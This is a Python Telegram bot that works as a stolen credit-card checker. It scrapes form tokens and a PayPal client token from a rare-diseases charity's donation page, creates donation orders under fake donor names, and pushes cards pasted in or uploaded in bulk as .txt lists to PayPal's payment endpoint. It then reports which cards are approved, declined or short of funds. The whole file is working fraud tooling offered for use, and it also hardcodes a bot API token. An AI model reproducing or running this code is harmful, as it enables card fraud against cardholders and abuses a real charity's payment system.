import telebot
import requests
import re
import time
import threading
import base64
from telebot import types
from user_agent import generate_user_agent

# --- الإعدادات ---
API_TOKEN = '8574162513:AAF8Rog4Fl-3JukDwQW-Fr-uxh9gklZYiH8'
bot = telebot.TeleBot(API_TOKEN)

# --- حالة الفحص ---
scanning_threads = {} # user_id: stop_event
user_amounts = {}     # user_id: amount

# --- منطق الفحص (PayPal) ---
def m3_iw(ccx, amount="1.00"):
    ccx = ccx.strip()
    try:
        parts = re.split(r'[|/:\-\s]+', ccx)
        if len(parts) < 4: return "INVALID_FORMAT ❌"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
    except Exception: return "INVALID_FORMAT ❌"

    if len(yy) == 2: yy = "20" + yy
    elif len(yy) == 4 and yy.startswith("20"): pass
    else: yy = "20" + yy[-2:]

    session = requests.Session()
    ua = generate_user_agent()
    headers = {'User-Agent': ua}

    try:
        resp = session.get('https://www.rarediseasesinternational.org/donations/donate/', headers=headers, timeout=20)
        m1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', resp.text).group(1)
        m2 = re.search(r'name="give-form-id" value="([^"]+)"', resp.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="([^"]+)"', resp.text).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', resp.text).group(1)
        
        dec = base64.b64decode(enc_token).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)

        ajax_data = {
            'give-honeypot': '', 'give-form-id-prefix': m1, 'give-form-id': m2,
            'give-form-hash': nonec, 'give-price-id': 'custom', 'give-amount': amount,
            'payment-mode': 'paypal-commerce', 'give_first': 'SiKO', 'give_last': 'User',
            'give_email': f'siko{int(time.time())}@gmail.com', 'give_action': 'purchase',
            'give-gateway': 'paypal-commerce', 'action': 'give_process_donation', 'give_ajax': 'true',
        }

        resp_ajax = session.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', 
                                headers={'User-Agent': ua, 'X-Requested-With': 'XMLHttpRequest'}, data=ajax_data, timeout=20)
        
        if 'data' not in resp_ajax.json() or 'id' not in resp_ajax.json()['data']:
            return "ORDER_NOT_APPROVED ⚠️"
            
        order_id = resp_ajax.json()['data']['id']

        pp_headers = {
            'Authorization': f'Bearer {au}',
            'Content-Type': 'application/json',
            'User-Agent': ua,
            'PayPal-Client-Metadata-Id': '7d9928a1f3f1fbc240cfd71a3eefe835'
        }
        
        pp_data = {
            'payment_source': {'card': {'number': n, 'expiry': f'{yy}-{mm}', 'security_code': cvc}},
            'application_context': {'vault': False}
        }

        resp_pp = session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                              headers=pp_headers, json=pp_data, timeout=20)
        
        pp_res = resp_pp.text
        if '"status":"APPROVED"' in pp_res: return "APPROVED ✅"
        elif 'INSTRUMENT_DECLINED' in pp_res: return "DECLINED ❌"
        elif 'INSUFFICIENT_FUNDS' in pp_res: return "INSUFFICIENT FUNDS 💰"
        elif 'CVV_FAILURE' in pp_res: return "WRONG CVV ❌"
        else:
            return "ORDER_NOT_APPROVED ⚠️"

    except Exception: return "ORDER_NOT_APPROVED ⚠️"

# --- الأوامر ---

@bot.message_handler(commands=['start'])
def start(message):
    image_url = "https://w0.peakpx.com/wallpaper/401/710/HD-wallpaper-killua-zoldyck-hunter-x-hunter-thumbnail.jpg"
    caption = (
        f"**WEDCSME 🌀 SiKO 🌀 👺**\n\n"
        f"**Status : Active ✅**\n\n"
        f"🐈‍⬛ **Choose amount and send CC or File**\n"
        f"**send /id 🐈‍⬛**"
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💰 1$ Check", callback_data="set_1")
    btn2 = types.InlineKeyboardButton("💰 5$ Check", callback_data="set_5")
    btn3 = types.InlineKeyboardButton("⌘ Dev", url="https://t.me/ManusAI")
    markup.add(btn1, btn2)
    markup.add(btn3)
    bot.send_photo(message.chat.id, image_url, caption=caption, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    if call.data == "set_1":
        user_amounts[user_id] = "1.00"
        bot.answer_callback_query(call.id, "Amount set to 1$ ✅")
        bot.send_message(call.message.chat.id, "✅ **Amount set to 1$**. Now send CC or File.", parse_mode='Markdown')
    elif call.data == "set_5":
        user_amounts[user_id] = "5.00"
        bot.answer_callback_query(call.id, "Amount set to 5$ ✅")
        bot.send_message(call.message.chat.id, "✅ **Amount set to 5$**. Now send CC or File.", parse_mode='Markdown')
    elif call.data.startswith('stop_'):
        uid = int(call.data.split('_')[1])
        if uid in scanning_threads:
            scanning_threads[uid].set()
            bot.answer_callback_query(call.id, "Stopped")
            bot.edit_message_text("🛑 Scan stopped.", call.message.chat.id, call.message.message_id)

@bot.message_handler(content_types=['document'])
def handle_combo(message):
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Send .txt file only.")
        return
    
    amount = user_amounts.get(message.from_user.id, "1.00")
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    cards = downloaded_file.decode('utf-8').splitlines()
    
    user_id = message.from_user.id
    stop_event = threading.Event()
    scanning_threads[user_id] = stop_event
    status_msg = bot.send_message(message.chat.id, f"⏳ Starting {amount}$ scan...")
    
    def process():
        approved, declined, total = 0, 0, len(cards)
        for i, card in enumerate(cards):
            if stop_event.is_set(): break
            card = card.strip()
            if not card: continue
            res = m3_iw(card, amount)
            if "APPROVED" in res: approved += 1
            else: declined += 1
            if (i+1) % 5 == 0 or (i+1) == total:
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{user_id}"))
                text = (
                    f"• 𝐆𝐚𝐭𝐞: #PayPal_Custom_CVV\n"
                    f"• 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}$ 🔥\n"
                    f"• 𝐒𝐢𝐭𝐞: rarediseasesinternational.org\n\n"
                    f"💳 Card: `{card}`\n"
                    f"📊 Result: {res}\n\n"
                    f"✅ Approved -> [{approved}]\n"
                    f"❌ Declined -> [{declined}]\n"
                    f"📁 Progress -> [{i+1}/{total}]"
                )
                try: bot.edit_message_text(text, message.chat.id, status_msg.message_id, reply_markup=markup, parse_mode='Markdown')
                except: pass
            time.sleep(1)
        bot.send_message(message.chat.id, f"🏁 **Scan Finished!**\n\n✅ Approved: {approved}\n❌ Declined: {declined}", parse_mode='Markdown')
        scanning_threads.pop(user_id, None)

    threading.Thread(target=process).start()

@bot.message_handler(func=lambda m: True)
def single(message):
    if "|" not in message.text: return
    amount = user_amounts.get(message.from_user.id, "1.00")
    msg = bot.reply_to(message, f"⏳ Checking card ({amount}$)...")
    res = m3_iw(message.text, amount)
    response = (
        f"• 𝐆𝐚𝐭𝐞: #PayPal_Custom_CVV\n"
        f"• 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}$ 🔥\n"
        f"• 𝐒𝐢𝐭𝐞: rarediseasesinternational.org\n\n"
        f"💳 `{message.text}`\n"
        f"📊 Result: **{res}**"
    )
    try: bot.edit_message_text(response, message.chat.id, msg.message_id, parse_mode='Markdown')
    except: bot.edit_message_text(response.replace("*", "").replace("`", ""), message.chat.id, msg.message_id)

if __name__ == "__main__":
    print("Bot with New Style Running...")
    bot.infinity_polling()
